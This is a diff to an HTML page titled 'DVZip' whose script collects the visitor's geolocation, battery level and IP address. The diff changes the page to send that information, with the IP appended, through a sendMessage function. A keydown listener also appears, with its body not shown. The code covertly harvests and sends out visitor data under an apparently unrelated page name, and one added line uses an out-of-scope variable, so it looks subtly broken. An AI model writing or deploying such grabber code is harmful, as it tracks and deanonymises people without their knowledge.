@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html>
 <head>
-<script defer src="/_vercel/insights/script.js"></script>
     <title>DVZip</title>
     <style>
         body {
@@ -49,9 +48,10 @@
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(position => {
                 info += "<p>Широта: " + position.coords.latitude + "</p>" +
-                    "<p>Долгота: " + position.coords.longitude + "</p>";
+                    "<p>Долгота: " + position.coords.longitude + "</p>" +
+                  "<p>IP: " + data.ip + "</p>"
                 document.getElementById("info").innerHTML = info;
-                sendMessage(info);
+
             });
         }
 
@@ -59,7 +59,7 @@
             navigator.getBattery().then(battery => {
                 info += "<p>Уровень заряда батареи: " + battery.level * 100 + "%" + "</p>";
                 document.getElementById("info").innerHTML = info;
-                sendMessage(info);
+
             });
         }
 
@@ -73,7 +73,7 @@
             .then(response => response.json())
             .then(data => {
                 document.getElementById("info").innerHTML += "<p>IP-адрес: " + data.ip + "</p>";
-                sendMessage(info);
+                sendMessage(info + data.ip);
             });
 
         document.addEventListener('keydown', event => {
